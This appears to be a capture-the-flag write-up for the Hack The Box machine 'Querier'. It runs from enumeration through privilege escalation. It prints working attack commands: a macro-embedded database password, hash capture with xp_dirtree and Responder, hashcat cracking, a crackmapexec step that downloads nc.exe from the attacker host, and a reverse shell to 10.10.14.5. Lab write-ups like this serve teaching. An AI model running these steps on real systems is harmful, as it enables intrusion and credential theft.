# Querier
> Silver Garcia 20/04/2024

## Enumeration
nmap
```bash
sudo nmap -T4 -A -p- 10.10.10.125     
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 23:10 EDT
Nmap scan report for 10.10.10.125
Host is up (0.052s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-21T02:57:54
|_Not valid after:  2054-04-21T02:57:54
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-04-21T03:12:15+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/20%OT=135%CT=1%CU=32905%PV=Y%DS=2%DC=T%G=Y%TM=662
OS:48410%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S
OS:%TS=U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW
OS:8NNS%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-21T03:12:07
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   52.20 ms 10.10.14.1
2   52.25 ms 10.10.10.125

```

Network shares:
```
smbclient -L 10.10.10.125          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk 
```

Nmap SQL scripts
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-21 00:29 EDT
Nmap scan report for 10.10.10.125
Host is up (0.052s latency).

Bug in ms-sql-dac: no string output.
Bug in ms-sql-hasdbaccess: no string output.
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
| ms-sql-config: 
|   10.10.10.125:1433: 
|_  ERROR: Bad username or password
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-tables: 
|   10.10.10.125:1433: 
|_[10.10.10.125:1433]
| ms-sql-empty-password: 
|_  10.10.10.125:1433: 
| ms-sql-dump-hashes: 
|_  10.10.10.125:1433: ERROR: Bad username or password
```

binwalk on `.xlsm` file
```
binwalk Currency\ Volume\ Report.xlsm 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 1087, name: [Content_Types].xml
936           0x3A8           Zip archive data, at least v2.0 to extract, compressed size: 244, uncompressed size: 588, name: _rels/.rels
1741          0x6CD           Zip archive data, at least v2.0 to extract, compressed size: 813, uncompressed size: 1821, name: xl/workbook.xml
2599          0xA27           Zip archive data, at least v2.0 to extract, compressed size: 260, uncompressed size: 679, name: xl/_rels/workbook.xml.rels
3179          0xC6B           Zip archive data, at least v2.0 to extract, compressed size: 491, uncompressed size: 1010, name: xl/worksheets/sheet1.xml
3724          0xE8C           Zip archive data, at least v2.0 to extract, compressed size: 1870, uncompressed size: 8390, name: xl/theme/theme1.xml
5643          0x160B          Zip archive data, at least v2.0 to extract, compressed size: 676, uncompressed size: 1618, name: xl/styles.xml
6362          0x18DA          Zip archive data, at least v2.0 to extract, compressed size: 3817, uncompressed size: 10240, name: xl/vbaProject.bin
10226         0x27F2          Zip archive data, at least v2.0 to extract, compressed size: 323, uncompressed size: 601, name: docProps/core.xml
10860         0x2A6C          Zip archive data, at least v2.0 to extract, compressed size: 400, uncompressed size: 794, name: docProps/app.xml
12207         0x2FAF          End of Zip archive, footer length: 22

```

Could unzip `.xlsm` file.
Found credentials on `xl/vbaProject/bin` file. Credentials:
uid=reporting
password=PcwTWTHRwryjc$c6
```
cat vbaProject.bin 
   `�
p�      ������  �����   &��     �����   2@*� ��
�       ����▒�  ���� ����(�- macro to pull data for client volume reports��▒.0n.Conn]�8]�X�x�
 0(<Open 0B@rver=<��SELECT * FROM volume; 0%B.6word> 0!> @�� MsgBox "connection successful" 6�A1�$D%FB@H 6B@Bk��Xo��P����������,Set rs = conn.Execute("SELECT * @@version;")����X�kDriver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6 0(:����▒� further testing required����H������Attribute VB_Name = "ThisWorkbook"

```

### MSSQL Enumeration


Could login with msfconsole `auxiliary/scanner/mssql/mssql_login`
```
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.10.10.125:1433     - 10.10.10.125:1433 - MSSQL - Starting authentication scanner.
[*] 10.10.10.125:1433     - Manually enabled TLS/SSL to encrypt TDS payloads.
[!] 10.10.10.125:1433     - No active DB -- Credential data will not be saved!
[+] 10.10.10.125:1433     - 10.10.10.125:1433 - Login Successful: QUERIER\reporting:PcwTWTHRwryjc$c6
[*] 10.10.10.125:1433     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Metasploit auxiliary/admin/mssql/mssql_enum:
```
[*] Running module against 10.10.10.125

[*] 10.10.10.125:1433 - Running MS SQL Server Enumeration...
[*] 10.10.10.125:1433 - Version:
[*]     Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
[*]             Aug 22 2017 17:04:49 
[*]             Copyright (C) 2017 Microsoft Corporation
[*]             Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] 10.10.10.125:1433 - Configuration Parameters:
[*] 10.10.10.125:1433 -         C2 Audit Mode is Not Enabled
[*] 10.10.10.125:1433 -         xp_cmdshell is Not Enabled
[*] 10.10.10.125:1433 -         remote access is Enabled
[*] 10.10.10.125:1433 -         allow updates is Not Enabled
[*] 10.10.10.125:1433 -         Database Mail XPs is Not Enabled
[*] 10.10.10.125:1433 -         Ole Automation Procedures are Not Enabled
[*] 10.10.10.125:1433 - Databases on the server:
[*] 10.10.10.125:1433 -         Database name:master
[*] 10.10.10.125:1433 -         Database Files for master:
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\master.mdf
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*] 10.10.10.125:1433 -         Database name:tempdb
[*] 10.10.10.125:1433 -         Database Files for tempdb:
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\templog.ldf
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\tempdb_mssql_2.ndf
[*] 10.10.10.125:1433 -         Database name:model
[*] 10.10.10.125:1433 -         Database Files for model:
[*] 10.10.10.125:1433 -         Database name:msdb
[*] 10.10.10.125:1433 -         Database Files for msdb:
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*] 10.10.10.125:1433 -         Database name:volume
[*] 10.10.10.125:1433 -         Database Files for volume:
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\volume.mdf
[*] 10.10.10.125:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\volume_log.ldf
[*] 10.10.10.125:1433 - System Logins on this Server:
[*] 10.10.10.125:1433 -         sa
[*] 10.10.10.125:1433 -         QUERIER\reporting
[*] 10.10.10.125:1433 - Disabled Accounts:
[*] 10.10.10.125:1433 -         sa
[*] 10.10.10.125:1433 - No Accounts Policy is set for:
[*] 10.10.10.125:1433 -         All System Accounts have the Windows Account Policy Applied to them.
[*] 10.10.10.125:1433 - Password Expiration is not checked for:
[*] 10.10.10.125:1433 -         sa
[*] 10.10.10.125:1433 - System Admin Logins on this Server:
[*] 10.10.10.125:1433 -         sa
[*] 10.10.10.125:1433 - Windows Logins on this Server:
[*] 10.10.10.125:1433 -         QUERIER\reporting
[*] 10.10.10.125:1433 - Windows Groups that can logins on this Server:
[*] 10.10.10.125:1433 -         No Windows Groups where found with permission to login to system.
[*] 10.10.10.125:1433 - Accounts with Username and Password being the same:
[*] 10.10.10.125:1433 -         No Account with its password being the same as its username was found.
[*] 10.10.10.125:1433 - Accounts with empty password:
[*] 10.10.10.125:1433 -         No Accounts with empty passwords where found.
[*] 10.10.10.125:1433 -         No Dangerous Stored Procedure found with Public Execute.
[*] 10.10.10.125:1433 - Instances found on this server:
[*] 10.10.10.125:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.10.10.125:1433 -         .\mssql-svc
[*] Auxiliary module execution completed
```

Databases:
```
 name
 ----
 master
 tempdb
 model
 msdb
 volume
```

Tables of master
```
 TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME        TABLE_TYPE
 -------------  ------------  ----------        ----------
 master         dbo           spt_fallback_db   BASE TABLE
 master         dbo           spt_fallback_dev  BASE TABLE
 master         dbo           spt_fallback_usg  BASE TABLE
 master         dbo           spt_values        VIEW
 master         dbo           spt_monitor       BASE TABLE
```

Tables of msdb
```
 TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME                                  TABLE_TYPE
 -------------  ------------  ----------                                  ----------
 msdb           dbo           syspolicy_system_health_state               VIEW
 msdb           dbo           syspolicy_policy_execution_history          VIEW
 msdb           dbo           syspolicy_policy_execution_history_details  VIEW
 msdb           dbo           syspolicy_configuration                     VIEW
 msdb           dbo           syspolicy_conditions                        VIEW
 msdb           dbo           syspolicy_policy_categories                 VIEW
 msdb           dbo           sysdac_instances                            VIEW
 msdb           dbo           syspolicy_object_sets                       VIEW
 msdb           dbo           dm_hadr_automatic_seeding_history           BASE TABLE
 msdb           dbo           syspolicy_policies                          VIEW
 msdb           dbo           backupmediaset                              BASE TABLE
 msdb           dbo           backupmediafamily                           BASE TABLE
 msdb           dbo           backupset                                   BASE TABLE
 msdb           dbo           autoadmin_backup_configuration_summary      VIEW
 msdb           dbo           backupfile                                  BASE TABLE
 msdb           dbo           syspolicy_target_sets                       VIEW
 msdb           dbo           restorehistory                              BASE TABLE
 msdb           dbo           restorefile                                 BASE TABLE
 msdb           dbo           syspolicy_target_set_levels                 VIEW
 msdb           dbo           restorefilegroup                            BASE TABLE
 msdb           dbo           logmarkhistory                              BASE TABLE
 msdb           dbo           suspect_pages                               BASE TABLE
 msdb           dbo           syspolicy_policy_category_subscriptions     VIEW
```

Users:
```
 login              login_type     password_hash  create_date       modify_date       status
 -----              ----------     -------------  -----------       -----------       ------
 QUERIER\reporting  WINDOWS_LOGIN                 e4a9000064c70200  e4a9000066c70200  Enabled
 sa                 SQL_LOGIN                     559300006e399700  e3a9000047518901  Disabled
```

**Could capture hash using `responder` and `auxiliary/admin/mssql/mssql_sql` metasploit module with following command:**
```
xp_dirtree '\\10.10.14.5\any\thing'
``` 
Steps:
1. Set responder:
```
sudo responder -I tun1 -dPv
```
2. Set `auxiliary/admin/mssql/mssql_sql` and command to `xp_dirtree '\\10.10.14.5\any\thing'`
3. Run module

Captured hash:
```
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:06c6dd4905a94ec0:3D442B56C547C8CBF3B93F03E781AB06:010100000000000000BC35DF3194DA01F523B85CC2B53B3900000000020008004A0056004A00560001001E00570049004E002D004100450054004300500032005900310033003500540004003400570049004E002D00410045005400430050003200590031003300350054002E004A0056004A0056002E004C004F00430041004C00030014004A0056004A0056002E004C004F00430041004C00050014004A0056004A0056002E004C004F00430041004C000700080000BC35DF3194DA010600040002000000080030003000000000000000000000000030000085713FC6F8CFC18DBA3A4D8610A76320E9E75B81C2A60440E8548DC63E3FB2430A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
```

Cracking hash with hashcat:
```bash
hashcat -a 0 -m 5600 mssql-svc_hash.txt /usr/share/wordlists/rockyou.txt
```
Cracked hash:
```
MSSQL-SVC::QUERIER:06c6dd4905a94ec0:3d442b56c547c8cbf3b93f03e781ab06:010100000000000000bc35df3194da01f523b85cc2b53b3900000000020008004a0056004a00560001001e00570049004e002d004100450054004300500032005900310033003500540004003400570049004e002d00410045005400430050003200590031003300350054002e004a0056004a0056002e004c004f00430041004c00030014004a0056004a0056002e004c004f00430041004c00050014004a0056004a0056002e004c004f00430041004c000700080000bc35df3194da010600040002000000080030003000000000000000000000000030000085713fc6f8cfc18dba3a4d8610a76320e9e75b81c2a60440e8548dc63e3fb2430a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000:corporate568
```

## Getting access

Using `crackmapexec` and mssql-svc credentials executed commands to get access:
1. Transfer nc.exe
```
crackmapexec mssql -d QUERIER -u mssql-svc -p corporate568 -x "curl http://10.10.14.5/nc.exe -o C:\Users\mssql-svc\nc.exe" 10.10.10.125
```
2. Set listener and execute command to get reverse shell
```
crackmapexec mssql -d QUERIER -u mssql-svc -p corporate568 -x "C:\Users\mssql-svc\nc.exe -e C:\Windows\System32\cmd.exe 10.10.14.5 4545" 10.10.10.125
```

## Privilege escalation

Credentials found using PowerUp:
```
[*] Checking for cached Group Policy Preferences .xml files....


Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
```

Got system shell using following steps:
1. Got semi-shell using `psexec.py`
```bash
psexec.py administrator:@10.10.10.125
```
2. Set listener and execute `nc.exe` already downloaded on mssql-svc folder
```cmd
C:\Users\mssql-svc\nc.exe -e C:\Windows\System32\cmd.exe 10.10.14.5 4545
```